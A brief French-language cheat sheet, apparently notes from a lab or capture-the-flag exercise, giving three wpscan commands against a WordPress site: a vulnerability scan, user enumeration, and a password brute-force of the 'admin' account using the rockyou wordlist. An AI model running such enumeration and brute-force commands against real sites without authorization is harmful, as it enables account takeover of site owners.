### checher les vulnérabilité du site :
```
$ wpscan --url http://alvida-eatery.org/
```
### Lister les utilisateurs du site :
```
$ wpscan --url http://alvida-eatery.org/ --enumerate u

```
### Chercher le mot de passe d'un site Wordpress avec un seul utilisateur
```
$ wpscan --url http://alvida-eatery.org/ -U admin -P /usr/share/wordlists/rockyou.txt

```